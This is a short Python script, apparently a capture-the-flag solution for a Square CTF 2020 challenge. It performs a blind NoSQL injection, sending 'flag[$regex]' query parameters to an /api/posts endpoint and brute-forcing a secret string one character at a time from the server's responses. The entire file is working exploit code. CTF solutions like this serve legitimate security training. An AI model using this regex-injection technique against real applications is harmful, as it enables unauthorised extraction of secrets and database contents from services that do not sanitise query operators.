import requests,string

flag = "fl"

l_lower = string.ascii_lowercase
l_upper = string.ascii_uppercase
l_total = l_lower + l_upper + "0123456789}{"

while True:
	for char in l_total:
		url = "http://challenges.2020.squarectf.com:9542/api/posts?flag[$regex]={}{}&title=flag".format(flag,char)
		req = requests.get(url)
		if "flag" in req.content:
			flag += str(char)
			print "Flag is : {}".format(flag)
			if char == "}": 
				exit(0)
			break
